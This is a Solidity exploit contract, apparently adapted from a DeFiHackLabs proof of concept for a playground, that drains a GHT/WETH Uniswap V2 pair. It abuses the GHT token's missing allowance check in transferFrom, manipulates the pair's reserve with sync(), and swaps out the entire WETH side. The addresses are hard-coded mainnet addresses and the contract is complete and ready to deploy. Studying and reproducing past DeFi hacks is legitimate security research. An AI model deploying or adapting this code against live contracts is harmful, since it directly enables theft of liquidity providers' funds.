// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2024-03-GHT).
// The DeFiHackLabs PoC runs the whole attack INLINE in the Foundry test contract
// (attacker = address(this), no standalone exploit contract, no flash-loan
// callback). This contract is a faithful, self-contained copy of that inline
// attack (testExploit's body moved into run()) so the playground can deploy it
// and record run(). Logic and constants are copied verbatim from
// test/GHT_exp.sol.
//
// Root cause: GHT (an ERC404 token behind an ERC1967 proxy) does not enforce
// the ERC20 allowance in transferFrom — any caller can move any holder's GHT
// balance with no prior approve(). The attacker (1) drains the GHT/WETH
// Uniswap V2 pair's GHT balance down to 1 wei by transferFrom'ing it to the GHT
// contract itself, (2) calls pair.sync() so the pair adopts the dust balance as
// its new reserve0 (collapsing k), (3) transfers the parked GHT back into the
// pair (restoring its real balance but NOT its stored reserve), then (4) calls
// pair.swap() to drain the entire WETH reserve — the pair's constant-product
// check is trivially satisfied because the GHT side is now wildly
// over-collateralized relative to the stale dust reserve.

interface IGHT {
    function transferFrom(address, address, uint256) external;
    function balanceOf(address) external view returns (uint256);
}

interface IWETH9 {
    function balanceOf(address) external view returns (uint256);
}

interface IUniPairV2 {
    function sync() external;
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes memory data) external;
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

contract GHTDrain {
    IWETH9 constant WETH = IWETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IGHT constant GHT = IGHT(0x528e046ACfb52bD3f9c400e7A5c79A8a2c2863d0);
    IUniPairV2 constant WETH_GHT = IUniPairV2(0x706206EabD6A70ca4992eEc1646B6D1599259CAe);

    function run() external {
        // Step 1: drain the pair's GHT balance down to 1 wei — no approval
        // needed, GHT.transferFrom() does not check allowance.
        uint256 amount = GHT.balanceOf(address(WETH_GHT));
        GHT.transferFrom(address(WETH_GHT), address(GHT), amount - 1);

        // Step 2: the pair adopts the dust balance as its new reserve0. k
        // collapses from ~6.0e42 to ~1.54e19; the WETH side (reserve1) is
        // untouched.
        WETH_GHT.sync();

        // Step 3: move the parked GHT back into the pair. Real balance is
        // restored to ~387,833.65 GHT, but the pair's STORED reserve0 is
        // still 1 — so the pair sees `balance - reserve0` as a huge amountIn.
        amount = GHT.balanceOf(address(GHT));
        GHT.transferFrom(address(GHT), address(WETH_GHT), amount);

        // Step 4: compute the constant-product amountOut against the stale
        // dust reserve0 and swap GHT -> WETH, draining the entire WETH side.
        uint256 balance = GHT.balanceOf(address(WETH_GHT));
        (uint256 reserveIn, uint256 reserveOut,) = WETH_GHT.getReserves();
        uint256 amountIn = balance - reserveIn;
        uint256 amountInWithFee = amountIn * 997;
        uint256 numerator = amountInWithFee * reserveOut;
        uint256 denominator = reserveIn * 1000 + amountInWithFee;
        uint256 amountOut = numerator / denominator;

        WETH_GHT.swap(0, amountOut, address(this), "");
    }
}
